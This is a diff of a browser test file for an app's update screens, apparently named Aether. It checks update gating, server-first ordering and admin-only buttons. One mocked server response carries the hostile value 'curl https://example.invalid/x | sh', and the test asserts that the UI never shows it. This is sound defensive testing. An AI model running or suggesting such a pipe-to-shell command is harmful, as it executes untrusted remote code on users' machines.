@@ -31,6 +31,7 @@ function clientStatus(latest: string, cli: Partial<UpdateStatus['cli']> = {}, ex
     install_method: 'direct',
     cli_path: '/x/aether',
     client_update_required: false,
+    can_self_update: true,
     ...extra,
   }
 }
@@ -148,7 +149,7 @@ test('a server that refuses this client gates the dashboard until it updates', a
       error: {
         code: -32005,
         message: refusal,
-        data: { client_version: 'v0.7.0', server_version: 'v0.8.0', min_client_version: 'v0.8.0', command: 'aether update' },
+        data: { client_version: 'v0.7.0', server_version: 'v0.8.0', min_client_version: 'v0.8.0', command: 'curl https://example.invalid/x | sh' },
       },
     }, 426)
   }
@@ -176,6 +177,7 @@ test('a server that refuses this client gates the dashboard until it updates', a
   await expect(gate.getByRole('heading', { name: 'Update Aether to keep using this server' })).toBeFocused()
   await expect(gate).toContainText(`The server said: ${refusal}. It accepts clients from v0.8.0.`)
   await expect(gate.getByText('aether update', { exact: true })).toBeVisible()
+  await expect(gate.getByText(/curl/)).toHaveCount(0)
   await expect(gate.getByRole('button', { name: 'Copy details' })).toBeVisible()
   await expect(gate.getByRole('button', { name: 'Reload' })).toBeVisible()
 
@@ -200,13 +202,13 @@ test('the server updates before its clients, and only an admin can start it', as
   const bob = await aether.member('bob')
   await bob.api.local('link.apply', { addr: aether.server.addr, invite: await aether.invite(alice), name: 'bob' })
 
-  const open = async (target: Page, url: string) => {
-    await routeUpdateCheck(target, () => clientStatus('v0.8.0'))
+  const open = async (target: Page, url: string, serverFirst: boolean) => {
+    await routeUpdateCheck(target, () => clientStatus('v0.8.0', {}, { server_behind: true, server_first: serverFirst }))
     await routeServerStatus(target, serverBehind)
     await target.goto(url)
   }
 
-  await open(page, alice.url)
+  await open(page, alice.url, true)
   const adminNotice = shell(page).getByRole('status').filter({ hasText: /is available/ })
   await expect(adminNotice).toHaveText(/^Server 0\.8\.0 is available\s*· Update$/)
   await adminNotice.getByRole('button', { name: 'Update' }).click()
@@ -216,7 +218,8 @@ test('the server updates before its clients, and only an admin can start it', as
   const clientRow = dialog.getByRole('status').filter({ hasText: 'Aether v0.8.0 is available.' })
   await expect(serverRow.getByRole('button', { name: 'Update now' })).toBeVisible()
   await expect(serverRow.getByRole('button', { name: 'Update when idle' })).toBeVisible()
-  await expect(clientRow).toContainText('Update the server first; this client updates after it.')
+  await expect(clientRow).toContainText('Update the server first, from its row above or with aether server update; this client updates after it.')
+  await expect(clientRow.getByRole('button', { name: 'Update now' })).toHaveCount(0)
   const serverFirst = await serverRow.evaluate(
     (server, client) => (server.compareDocumentPosition(client as Node) & Node.DOCUMENT_POSITION_FOLLOWING) !== 0,
     await clientRow.elementHandle(),
@@ -226,7 +229,7 @@ test('the server updates before its clients, and only an admin can start it', as
   const bobContext = await browser.newContext()
   try {
     const bobPage = await bobContext.newPage()
-    await open(bobPage, bob.url)
+    await open(bobPage, bob.url, false)
     const memberNotice = shell(bobPage).getByRole('status').filter({ hasText: /is available/ })
     await expect(memberNotice).toHaveText(/^Server 0\.8\.0 is available, ask an admin\s*· Update$/)
     await memberNotice.getByRole('button', { name: 'Update' }).click()
